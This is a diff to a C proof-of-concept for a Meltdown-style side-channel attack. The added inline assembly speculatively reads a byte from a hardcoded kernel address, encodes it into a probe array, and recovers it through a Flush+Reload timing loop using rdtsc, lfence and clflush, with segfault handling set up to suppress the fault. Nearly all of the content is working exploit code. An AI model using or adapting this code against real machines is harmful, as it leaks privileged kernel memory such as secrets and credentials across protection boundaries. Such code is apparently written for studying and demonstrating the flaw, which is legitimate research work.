@@ -24,6 +24,9 @@ int main() {
 	int i;
 	int i_min = -1;
 	unsigned char dummy;
+    unsigned char *page;
+
+    unsigned long wanted_address = 0xffffffff844001a8;
 
 	// setup segfault handling
 	struct sigaction segfault_act;
@@ -41,12 +44,24 @@ int main() {
             goto end;
 
         // FIXME: asm volatile ("" : : "b"(array+PAGE_SIZE));
-        asm volatile ("" : : "b"(array));
-        asm volatile ("movq $0xffffffff844001a0, %rcx");
-        asm volatile ("xorq %rax, %rax");
-        asm volatile ("movb (%rcx), %al");
-        asm volatile ("shlq $0xc, %rax");
-        asm volatile ("movq (%rbx,%rax), %rbx");
+        // asm volatile ("" : : "b"(array));
+        // asm volatile ("movq $0xffffffff844001a0, %rcx");
+        // asm volatile ("xorq %rax, %rax");
+        // asm volatile ("movb (%rcx), %al");
+        // asm volatile ("shlq $0xc, %rax");
+        // asm volatile ("movq (%rbx,%rax), %rbx");
+
+        asm volatile (
+                "%=:                              \n"
+                "xorq %%rax, %%rax                \n"
+                "movb (%[wanted_address]), %%al              \n"
+                "shlq $0xc, %%rax                 \n"
+                "jz %=b                           \n"
+                "movq (%[array], %%rax, 1), %%rbx   \n"
+                :
+                :  [wanted_address] "r" (wanted_address), [array] "r" (array)
+                :  "%rax", "%rbx");
+
 
 end:
         // dummy = array[PAGE_SIZE*WANTED_VALUE];
@@ -54,24 +69,41 @@ end:
 
         for(i=1; i<=256; i++) {
             // https://stackoverflow.com/a/14214220/2057521
+            // asm volatile (
+            //         "cpuid\n\t"/*serialize*/
+            //         "rdtsc\n\t"/*read the clock*/
+            //         "mov %%edx, %0\n\t"
+            //         "mov %%eax, %1\n\t": "=r" (cycles_high_start), "=r"
+            //         (cycles_low_start):: "%rax", "%rbx", "%rcx", "%rdx");
+
+            // dummy = array[PAGE_SIZE*i];
+
+            page = &array[PAGE_SIZE*i];
             asm volatile (
-                    "cpuid\n\t"/*serialize*/
-                    "rdtsc\n\t"/*read the clock*/
-                    "mov %%edx, %0\n\t"
-                    "mov %%eax, %1\n\t": "=r" (cycles_high_start), "=r"
-                    (cycles_low_start):: "%rax", "%rbx", "%rcx", "%rdx");
+                    "mfence             \n"
+                    "lfence             \n"
+                    "rdtsc              \n"
+                    "lfence             \n"
+                    "movl %%eax, %%esi  \n"
+                    "movl (%1), %%eax   \n"
+                    "lfence             \n"
+                    "rdtsc              \n"
+                    "subl %%esi, %%eax  \n"
+                    "clflush 0(%1)      \n"
+                    : "=a" (cycles)
+                    : "c" (page)
+                    :  "%esi", "%edx");
 
-            dummy = array[PAGE_SIZE*i];
 
-            asm volatile (
-                    "rdtscp\n\t"/*read the clock*/
-                    "mov %%edx, %0\n\t"
-                    "mov %%eax, %1\n\t"
-                    "cpuid\n\t": "=r" (cycles_high_end), "=r"
-                    (cycles_low_end):: "%rax", "%rbx", "%rcx", "%rdx");
+            // asm volatile (
+            //         "rdtscp\n\t"/*read the clock*/
+            //         "mov %%edx, %0\n\t"
+            //         "mov %%eax, %1\n\t"
+            //         "cpuid\n\t": "=r" (cycles_high_end), "=r"
+            //         (cycles_low_end):: "%rax", "%rbx", "%rcx", "%rdx");
 
-            cycles = (((unsigned long) cycles_high_end << 32) | cycles_low_end) -
-                ((unsigned long) cycles_high_start << 32 | cycles_low_start);
+            // cycles = (((unsigned long) cycles_high_end << 32) | cycles_low_end) -
+            //     ((unsigned long) cycles_high_start << 32 | cycles_low_start);
 
             // printf("cycles %3d: %lu\n", i, cycles);
 
